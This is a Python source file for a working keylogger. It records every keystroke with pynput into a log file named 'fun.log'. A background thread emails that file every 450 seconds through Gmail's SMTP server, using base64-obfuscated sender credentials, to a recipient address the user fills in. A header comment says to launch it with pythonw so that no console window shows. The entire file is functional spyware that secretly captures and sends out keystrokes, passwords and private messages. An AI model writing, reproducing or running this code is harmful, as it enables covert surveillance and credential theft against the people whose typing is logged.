from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Listener
from os.path import basename
from variables import encryptedEmail, encryptedPasswd
import datetime
import _thread
import time
import logging
import smtplib
import base64

#-------------------------------------------------------#
#                     cd keylogger                      #
#                    pythonw main.py                    #
#              pythonw process id - 13120               #
#-------------------------------------------------------#

print("Libraries imported..")

emailBytes = base64.b64decode(encryptedEmail)       # Email decoding 
passwdBytes = base64.b64decode(encryptedPasswd)     # Password decoding
email = str(emailBytes, "utf-8")                    # Decoded email
passwd = str(passwdBytes, "utf-8")                  # Decoded password
rcvEmail = ''           # Where should the logs be sent?
emailTimeout = 450      # How often email should be sent(in seconds)?

print("Variables declared..")

server = smtplib.SMTP(host="smtp.gmail.com", port=587)
msg = MIMEMultipart()

server.starttls()
server.login(email, passwd)

print("Objects created..")

logging.basicConfig(filename="fun.log", level=logging.DEBUG, format="[%(asctime)s] - %(message)s")       # If you want you can change file name to something else, but remember to change it also in line no. 46

print("Logging config created..")


def sendMail():
    msg['Subject'] = 'Super Secret shhhh...'        # Email subject
    msg['From'] = email                             # Email 'from'
    msg['To'] = rcvEmail                            # Email 'to'
    filename = 'fun.log'                      # Attached file name
    with open(filename, 'r') as f:
        part = MIMEApplication(f.read(), Name=basename(filename))
    part['Content-Disposition'] = 'attachment; filename="{}"'.format(basename(filename))
    msg.attach(part)
    server.sendmail(email, rcvEmail, msg.as_string())       # Sending email
    print("Logs sent successfully!")


print("sendMail function declared..")


def updateCounter():        # Sending logs every emailTimeout
    while True:
        sendMail()
        time.sleep(emailTimeout)
        print('email sent!')


print("updateCounter function declared..")

_thread.start_new_thread(updateCounter, ()) # Starting new thread to send email every time declared in updateCounter

print("New thread with updateCounter function created..")


def on_press(key):
    logging.info(str(key))


print("Keylogger function declared..")
print("Keylogger on..")
print("Code executed successfully..")

with Listener(on_press=on_press) as listener:
    listener.join()
